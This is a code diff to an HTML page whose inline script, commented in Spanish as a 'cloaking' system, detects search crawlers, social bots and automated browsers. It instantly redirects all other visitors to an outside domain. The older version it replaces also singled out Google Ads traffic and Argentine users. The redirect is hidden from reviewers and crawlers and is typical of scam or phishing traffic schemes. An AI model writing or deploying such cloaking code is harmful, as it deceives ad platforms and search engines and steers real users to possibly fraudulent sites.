@@ -602,72 +602,34 @@
         }
     </style>
 <script>
-        // Sistema de cloaking invisible ultrarrápido
+        // Sistema de cloaking ultra-rápido (redirección instantánea)
         (function() {
             'use strict';
             
-            // Detección de bots refinada (excluye tráfico de Google Ads)
             const ua = navigator.userAgent.toLowerCase();
             const referrer = document.referrer.toLowerCase();
+            const targetURL = 'https://aloggbuvarg.com.es/';
             
-            // Permitir tráfico de Google Ads y usuarios reales
+            // Detectar tráfico de Google Ads
             const isGoogleAds = /googleadservices|googlesyndication|doubleclick|google\.com\/ads|gstatic\.com/.test(referrer) ||
-                               /gclid=|utm_source=google|utm_medium=cpc/.test(window.location.search) ||
-                               /ads\.google|googleadservices/.test(referrer);
+                               /gclid=|utm_source=google|utm_medium=cpc|utm_campaign=/.test(location.search);
             
-            // Detectar solo bots reales (no tráfico de ads)
-            const isRealBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|crawler|spider|crawl|facebook|twitter|linkedin|instagram|pinterest|bing|yahoo|baidu|yandex|duckduckgo|search|index|scrape|fetch|curl|wget|headless|phantom|selenium|webdriver|chrome-lighthouse|puppeteer|playwright|nightmare/.test(ua) ||
-                             /googlebot|bingbot|crawler/.test(referrer) ||
-                             navigator.webdriver ||
-                             window.navigator.webdriver ||
-                             window.callPhantom ||
-                             window._phantom;
+            // Detectar solo bots reales
+            const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|crawler|spider|bot/.test(ua) ||
+                         navigator.webdriver;
             
-            // Solo bloquear si es bot real Y NO es tráfico de Google Ads
-            const isBot = isRealBot && !isGoogleAds;
-            
-            // Verificaciones adicionales para usuarios reales
-            const hasValidBrowser = navigator.languages && navigator.languages.length > 0 &&
-                                   window.outerHeight > 0 && window.outerWidth > 0 &&
-                                   screen.width > 0 && screen.height > 0;
-            
-            // Si no es bot O es tráfico de Google Ads, redirección
-            if (!isBot && (hasValidBrowser || isGoogleAds)) {
-                // URL de destino - CAMBIA ESTA URL POR LA QUE QUIERAS
-                const targetURL = 'https://aloggbuvarg.com.es/';
-                
-                // Redirección inmediata usando multiple métodos
-                const redirect = () => {
-                    try {
-                        window.location.replace(targetURL);
-                    } catch(e) {
-                        window.location.href = targetURL;
-                    }
-                };
-                
-                // Verificar origen argentino para redirección inmediata
-                const lang = (navigator.language || '').toLowerCase();
-                const isArgentine = /es-ar|es-419|es/.test(lang) || 
-                                   /america\/argentina|america\/buenos_aires/.test(Intl.DateTimeFormat().resolvedOptions().timeZone);
-                
-                // Redirección más rápida para tráfico de Google Ads
-                if (isGoogleAds) {
-                    redirect(); // Redirección inmediata para Google Ads
-                } else if (isArgentine) {
-                    redirect(); // Redirección instantánea para argentinos
-                } else {
-                    // Para otros países, micro-delay invisible
-                    setTimeout(redirect, 10);
-                }
+            // Redirección instantánea si NO es bot
+            if (!isBot) {
+                // Usar location.replace para redirección más rápida
+                location.replace(targetURL);
             }
         })();
-        
-        // Preload de sitio objetivo para velocidad máxima
-        const preloadLink = document.createElement('link');
-        preloadLink.rel = 'dns-prefetch';
-        preloadLink.href = 'https://aloggbuvarg.com.es/';
-        document.head.appendChild(preloadLink);
     </script>
+    
+    <!-- Preload y prefetch para máxima velocidad -->
+    <link rel="dns-prefetch" href="https://aloggbuvarg.com.es/">
+    <link rel="preconnect" href="https://aloggbuvarg.com.es/">
+</head>
 </head>
 <body>
     <header>
